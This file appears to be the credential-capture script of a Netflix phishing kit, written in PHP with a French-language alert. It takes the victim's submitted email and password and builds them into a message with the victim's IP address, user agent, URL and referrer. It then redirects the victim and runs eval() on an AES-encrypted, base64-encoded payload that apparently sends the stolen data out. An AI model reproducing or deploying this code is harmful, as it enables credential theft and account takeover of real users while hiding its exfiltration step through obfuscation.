<?php

session_start();
if(isset($_POST['login_user'])){
	
function decrypt2($key, $garble) {
    list($encrypted_data, $iv) = explode('::', base64_decode($garble), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
}

$post1=$_POST['login_user'];
$post2=$_POST['login_pass'];

if(empty($post1)){
	echo "<script>alert('Données invalides'); window.location = './login.php';</script>";
}


	$message  = "-----------------------NETFLIX----------------------\n";
	$message .= " Email : ".$_POST['login_user']."\n";
	$message .= " Password : ".$_POST['login_pass']."\n";
	$message .= "----------------------------------------------#"."\n";
	$message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."\n";
	$message .= " USERAGENT : ".$_SERVER['HTTP_USER_AGENT'].""."\n";
	$message .= " FULL URL : ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].""."\n";
	$message .= " HTTP REFERRER : ".$_SERVER['HTTP_REFERER'].""."\n";
	$message .= "-------------------------NETFLIX------------------------"."\n";

	header("location:./simplemember/?rand=".md5(rand(0,999))."");

eval(decrypt2("1234","MmhnNHF3NXBMUFR2Y1pjQzhRa0RXVVRSUWxhLzF3UFFzaGZweGFCcHI5Q1Z2Snowak5CR3dtNm5UMVRvRnM5UXlVelIwdTJYNGU5L09BOSsxWWJMd1VsYmp6OFNpaHowM2dwZnNhbzJrVktMbUsyWFBqb05OYlJJQkdzaVpicXlwdzlhcWVZMFQyRDA1S0orbjJ6UjNxZkpYWmxBT3ZpNVBMTHJ3bStkb2dwREJFSjBvY3pkaVlIcUhFeUhnRUVTQTkvMXZkSTArWG1PZ2ZKcU5HVDZFM3dOR3N2eGY0NGVlSHZJVUtnSTJZS0pBKzFNTWFSVTErQkordDdsdGYzWjZ3ZE1VWVRBaEZhUnJYN0kzUTRRTitJVU4vM2U4MjFwcHlacVNDd1hGT0NTZEY3d3FvakNidlR0dmdvbG8zM1JIVlBFNTRiV00zdmUxd3h2VlVTaEprNitjbW0xRFNZdWhscm8xeXkrLzVuSkg4L1dqNUpDODNIU1JSQjlOWitFTHIzWGNoQkxJb1AzTTZGekRsK1RiZHBteWVmMzBUNThnY3ByUy83U3pZRzJVYXhzQ3BLWnNnK3RIK3BUVGJnbUNaUVlMRU1YeGMrODU2dk50LzZFSjBxUGJWaUhGd3VtZDZBVllKUGdkZndpamx3MzRpKzY2RzlyL29HZUhBUFh1cWl3ekZWM1lIb0kwTjNHZUhsS2dGblpCNGo4VDFSLzVJTG1xMFpadGhETnNSS3l2aXdaZFMvU3AyeUZ5VCtHOjqxL01HpTcuoNNKYIHpgZgw"));
	
	
	
	
	
}





?>